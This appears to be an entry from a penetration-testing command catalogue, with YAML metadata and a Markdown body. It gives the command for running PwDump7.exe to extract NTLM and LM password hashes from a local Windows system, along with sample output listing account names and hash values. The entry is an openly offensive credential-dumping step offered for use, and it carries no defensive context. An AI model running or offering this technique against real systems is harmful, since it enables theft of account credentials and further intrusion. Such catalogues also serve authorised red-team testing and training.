---
id: b22038c2-b5b3-4b3a-ad8d-cf423feab193
name: pwdump7 Dump NTLM and LM hashes from a Local Windows System
type: command
executor: bash
data: PwDump7.exe
output: 'C:\Users\BOB\Desktop>PwDump7.exe

  Pwdump v7.1 - raw password extractor

  Author: Andres Tarasco Acuna

  url: http://www.514.es


  Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C08

  9C0:::

  Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::

  BOB:1000:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::


  HomeGroupUser$:1002:NO PASSWORD*********************:E47E1AB30238D34A8A7BA62278E

  CA4C7:::'
created_at: '2019-09-26T22:51:06.757922+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# pwdump7 Dump NTLM and LM hashes from a Local Windows System

```bash
PwDump7.exe
```

## Expected Output

```
C:\Users\BOB\Desktop>PwDump7.exe
Pwdump v7.1 - raw password extractor
Author: Andres Tarasco Acuna
url: http://www.514.es

Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C08
9C0:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
BOB:1000:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::

HomeGroupUser$:1002:NO PASSWORD*********************:E47E1AB30238D34A8A7BA62278E
CA4C7:::
```


